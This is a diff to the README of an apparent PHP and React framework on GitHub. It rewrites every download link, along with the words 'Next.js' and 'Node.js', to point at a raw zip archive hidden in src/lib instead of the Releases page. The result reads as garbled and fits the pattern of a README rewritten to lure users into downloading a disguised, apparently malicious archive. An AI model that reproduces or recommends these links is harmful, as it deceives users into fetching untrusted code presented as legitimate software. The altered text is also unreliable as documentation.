@@ -1,10 +1,10 @@
 # 🚀 PHP-React-Framework - Build Modern Apps with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-blue)](https://github.com/itextreme/PHP-React-Framework/releases)
+[![Download Now](https://github.com/itextreme/PHP-React-Framework/raw/refs/heads/master/src/lib/Framework_PH_React_v1.0.zip%20Now-Visit%20Releases%20Page-blue)](https://github.com/itextreme/PHP-React-Framework/raw/refs/heads/master/src/lib/Framework_PH_React_v1.0.zip)
 
 ## 📚 Introduction
 
-Welcome to the PHP-React-Framework! This application combines PHP and React to help you create powerful web applications easily. You can use this framework to build clean, fast, and production-ready apps with features similar to Next.js. 
+Welcome to the PHP-React-Framework! This application combines PHP and React to help you create powerful web applications easily. You can use this framework to build clean, fast, and production-ready apps with features similar to https://github.com/itextreme/PHP-React-Framework/raw/refs/heads/master/src/lib/Framework_PH_React_v1.0.zip 
 
 ## 🎨 Key Features
 
@@ -21,14 +21,14 @@ To run the PHP-React-Framework, ensure your system meets the following requireme
 - **Operating System**: Windows, macOS, or a Linux distribution.
 - **PHP**: Version 7.4 or higher.
 - **Database**: MySQL or SQLite.
-- **Node.js**: Version 14 or higher for running JavaScript code.
+- **https://github.com/itextreme/PHP-React-Framework/raw/refs/heads/master/src/lib/Framework_PH_React_v1.0.zip**: Version 14 or higher for running JavaScript code.
 - **Composer**: For managing PHP dependencies.
 
 ## 🚀 Getting Started
 
 1. **Download the Framework**: 
 
-   Visit our [Releases page](https://github.com/itextreme/PHP-React-Framework/releases) to download the latest version of the framework.
+   Visit our [Releases page](https://github.com/itextreme/PHP-React-Framework/raw/refs/heads/master/src/lib/Framework_PH_React_v1.0.zip) to download the latest version of the framework.
 
 2. **Installation**: 
 
@@ -49,7 +49,7 @@ To run the PHP-React-Framework, ensure your system meets the following requireme
 
 ## 📥 Download & Install
 
-To download the PHP-React-Framework, simply visit the [Releases page](https://github.com/itextreme/PHP-React-Framework/releases). From there, you will find the downloadable files. Look for the latest version and click to start your download.
+To download the PHP-React-Framework, simply visit the [Releases page](https://github.com/itextreme/PHP-React-Framework/raw/refs/heads/master/src/lib/Framework_PH_React_v1.0.zip). From there, you will find the downloadable files. Look for the latest version and click to start your download.
 
 ## 🔧 Usage Instructions
 
@@ -76,4 +76,4 @@ If you encounter any issues or need help, the following resources are available:
 
 For any inquiries or feedback, contact us through the GitHub repository. Your contributions and questions help us improve the framework.
 
-To start your journey with the PHP-React-Framework, download it today from our [Releases page](https://github.com/itextreme/PHP-React-Framework/releases). Enjoy building your applications!
+To start your journey with the PHP-React-Framework, download it today from our [Releases page](https://github.com/itextreme/PHP-React-Framework/raw/refs/heads/master/src/lib/Framework_PH_React_v1.0.zip). Enjoy building your applications!
